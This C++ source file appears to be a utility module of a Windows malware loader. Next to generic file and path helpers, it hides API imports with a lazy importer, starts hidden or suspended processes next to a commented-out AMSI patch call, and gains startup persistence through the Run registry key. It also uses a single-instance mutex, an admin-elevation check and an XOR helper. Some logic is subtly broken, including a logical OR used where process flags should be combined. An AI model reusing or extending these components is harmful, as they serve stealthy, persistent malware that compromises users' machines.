#include "common_util.h"
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <libloaderapi.h>
#include <filesystem>
#include <wchar.h>
#include "lib/lazy_importer.hpp"
#include <tchar.h>
#include <fstream>
#include <vector>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <mutex>
#include <sys/stat.h> // POSIX
#ifdef _WIN32
    #include <direct.h> // Windows _mkdir
    #define mkdir(path, mode) _mkdir(path)
#else
    #include <unistd.h>
#endif

#include <sstream>
#include <iostream>
#include <string>
#include <algorithm>
#include <cctype>
#include <vector>

bool DisableSleep(){
 return false;
}

void run_program(const char* programPath, const char* cmdLine){
      STARTUPINFO si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);

    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    if (!LI_FN(CreateProcessA)(
            programPath,
            (LPTSTR)cmdLine,
        nullptr, //lpProcessAttributes
        nullptr, //lpThreadAttributes
            FALSE, //bInheritHandles
            CREATE_SUSPENDED || HIDE_WINDOW, //dwCreationFlags
        nullptr, //lpEnvironment 
        nullptr, //lpCurrentDirectory
            &si, //lpStartupInfo
            &pi //lpProcessInformation
        ))
    {
        std::cerr << "[ERROR] CreateProcess failed, Error = " << std::hex << GetLastError() << "\n";
    }
    // AmsiPatcher patcher(pi.dwProcessId);
    // patcher.PatchAmsi();
    LI_FN(ResumeThread)(pi.hThread);
}

bool runProcess(const std::string& commandLine) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Create the process
    BOOL success = CreateProcessA(
        nullptr,               // No module name (use command line)
    (LPSTR)commandLine.c_str(), // Command line
        nullptr, nullptr,      // Process/thread security
        FALSE,                 // No handle inheritance
        CREATE_NO_WINDOW,      // No console window
        nullptr, nullptr,      // Use parent's environment and directory
        &si, &pi
    );

    if (!success) {
        std::wcerr << L"CreateProcess failed with error " << GetLastError() << "\n";
        return false;
    }

    // Wait for the process to finish (optional)
    WaitForSingleObject(pi.hProcess, INFINITE);

    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::wcout << L"Process exited with code " << exitCode << "\n";
    return (exitCode == 0);
}



char manualXOR(char a, char b) {
    char result = 0;
    for (int i = 0; i < 8; ++i) {
        result |= (((a >> i) & 1) != ((b >> i) & 1)) << i;
    }
    return result;
}

void StringToWString(std::wstring &ws, const std::string &s)
{
    std::wstring wsTmp(s.begin(), s.end());

    ws = wsTmp;
}

std::wstring ConvertToWide(LPCTSTR cmdLine)
{
#ifdef UNICODE
    return std::wstring(cmdLine); // already wide
#else
    int len = MultiByteToWideChar(CP_ACP, 0, cmdLine, -1, nullptr, 0);
    std::wstring result(len, 0);
    MultiByteToWideChar(CP_ACP, 0, cmdLine, -1, &result[0], len);
    return result;
#endif
}


std::vector<uint8_t> toUTF16LE(const std::wstring& input) {
    std::vector<uint8_t> utf16le;
    for (wchar_t wc : input) {
        uint16_t code_unit = static_cast<uint16_t>(wc); // assumes wchar_t is 16-bit (Windows)
        utf16le.push_back(static_cast<uint8_t>(code_unit & 0xFF));        // low byte
        utf16le.push_back(static_cast<uint8_t>((code_unit >> 8) & 0xFF)); // high byte
    }
    return utf16le;
}

void writeAllBytes(const std::string& filename, const std::vector<char>& data) {
    std::ofstream outFile(filename, std::ios::binary);

    if (!outFile) {
        throw std::runtime_error("Could not open file for writing: " + filename);
    }

    outFile.write(data.data(), data.size());

    if (!outFile) {
        throw std::runtime_error("Failed to write all data to file: " + filename);
    }
}



std::vector<char> readAllBytes(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);

    if (!file) {
        throw std::runtime_error("Could not open file: " + filename);
    }

    // Determine file size
    file.seekg(0, std::ios::end);
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    // Allocate buffer
    std::vector<char> buffer(size);

    // Read content
    if (!file.read(buffer.data(), size)) {
        throw std::runtime_error("Failed to read the complete file");
    }

    return buffer;
}

bool fileExists(const std::string& filename) {
    std::ifstream file(filename);
    return file.good();
}

DWORD splitFirstSpace(LPCTSTR str) {
    // Convert LPCTSTR to the appropriate string type based on _UNICODE or not.
#ifdef UNICODE
    std::wstring wstr(str);
#else
    std::string wstr(str);
#endif

    // Find the position of the first space in the string
    size_t pos;
#ifdef UNICODE
    pos = wstr.find(L' ');
#else
    pos = wstr.find(' ');
#endif

    // If there is no space, return the entire length of the string
    if (pos == std::wstring::npos) {
        return static_cast<DWORD>(wstr.length() * sizeof(WCHAR));
    }

    // Otherwise, return the length up to that space
#ifdef UNICODE
    return static_cast<DWORD>(wstr.substr(0, pos).length()* 2);
#else
    return static_cast<DWORD>(wstr.substr(0, pos).length() * sizeof(CHAR));
#endif
}

// Function to add/modify a string value in the Windows Registry.
bool AddRegistryValue(const std::string& startupPath, const char* valueName) {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    

    // Open or create the registry key
    if (LI_FN(RegOpenKeyExA)(HKEY_CURRENT_USER, regPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        // Write the path to the registry
        if (LI_FN(RegSetValueExA)(hKey, valueName, 0, REG_SZ, 
                reinterpret_cast<const BYTE*>(startupPath.c_str()), 
                static_cast<DWORD>(startupPath.length() + 1)) == ERROR_SUCCESS) {
            std::cout << "Successfully added to startup.\n";
        } else {
            std::cerr << "Failed to set registry value.\n";
        }
        LI_FN(RegCloseKey)(hKey);
    } else {
        std::cerr << "Failed to open registry key.\n";
        return false;
    }
    return true;
}


// Check if a directory exists
bool directoryExists(const std::string& path) {
    struct stat info;
    return stat(path.c_str(), &info) == 0 && (info.st_mode & S_IFDIR);
}

// Create a single directory
bool createDirectory(const std::string& path) {
    return mkdir(path.c_str(), 0755) == 0 || errno == EEXIST;
}

// Split a string by backslash '\'
std::vector<std::string> splitPath(const std::string& path) {
    std::vector<std::string> parts;
    std::string current;
    for (size_t i = 0; i < path.size(); ++i) {
        if (path[i] == '\\') {
            if (!current.empty()) {
                parts.push_back(current);
                current.clear();
            }
        } else {
            current += path[i];
        }
    }
    if (!current.empty()) {
        parts.push_back(current);
    }
    return parts;
}

bool endsWithExe(const std::string& path) {
    const std::string ext = ".exe";
    if (path.length() >= ext.length()) {
        return path.compare(path.length() - ext.length(), ext.length(), ext) == 0;
    }
    return false;
}

bool createPathRecursively(std::string fullPath) {
    // If the path ends with .exe, strip the filename
    if (endsWithExe(fullPath)) {
        size_t lastSlash = fullPath.find_last_of("\\/");
        if (lastSlash != std::string::npos) {
            fullPath = fullPath.substr(0, lastSlash);  // Remove the file name
        }
    }

    std::vector<std::string> parts = splitPath(fullPath);
    std::string currentPath;

    // Handle drive letter like "C:"
    if (parts.size() > 0 && parts[0].size() == 2 && parts[0][1] == ':') {
        currentPath = parts[0];
        parts.erase(parts.begin());
    }

    for (const auto& part : parts) {
        if (!currentPath.empty() && currentPath.back() != '\\') {
            currentPath += "\\";
        }
        currentPath += part;

        if (!directoryExists(currentPath)) {
            if (!createDirectory(currentPath)) {
                std::cerr << "Failed to create: " << currentPath << "\n";
                return false;
            }
        }
    }

    return true;
}

bool InstallCheck(){
    return true;
}

bool mutexExists(const std::string& name) {
    HANDLE hMutex = CreateMutexA(
        nullptr,     // default security
        FALSE,       // not initially owned
        name.c_str() // mutex name
    );

    if (hMutex == nullptr) {
        // Failed to create (bad permissions or name)
        return false;
    }

    bool alreadyExists = (GetLastError() == ERROR_ALREADY_EXISTS);

    // Clean up
    CloseHandle(hMutex);

    return alreadyExists;
}

bool IsAdmin(){
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY* sidAuth = NULL;
    HANDLE hToken = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)){
        TOKEN_ELEVATION elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &cbSize)){
            isAdmin = elevation.TokenIsElevated;
        }
    }
    return isAdmin;
}


std::string toLower(const std::string& str) {
    std::string result = str;
    std::transform(result.begin(), result.end(), result.begin(),
                   [](unsigned char c) { return std::tolower(c); });
    return result;
}


std::string normalizeSlashes(const std::string& path) {
    std::string result = path;
    std::replace(result.begin(), result.end(), '\\', '/');
    return result;
}

std::string normalizePath(const std::string& rawPath) {
    std::string path = normalizeSlashes(rawPath);
    std::vector<std::string> components;
    size_t start = 0;

    while (start < path.size()) {
        size_t end = path.find('/', start);
        if (end == std::string::npos) end = path.size();
        std::string part = path.substr(start, end - start);

        if (part == "..") {
            if (!components.empty()) components.pop_back();  // Go up one level
        } else if (!part.empty() && part != ".") {
            components.push_back(part);
        }
        start = end + 1;
    }

    std::string result;
    for (const auto& comp : components) {
        result += "/" + comp;
    }

    return toLower(result.empty() ? "/" : result);
}

bool arePathsEqual(const char* path1, const std::string& path2) {
    if (!path1) return false;
    std::string p1 = normalizePath(path1);
    std::string p2 = normalizePath(path2);
    return p1 == p2;
}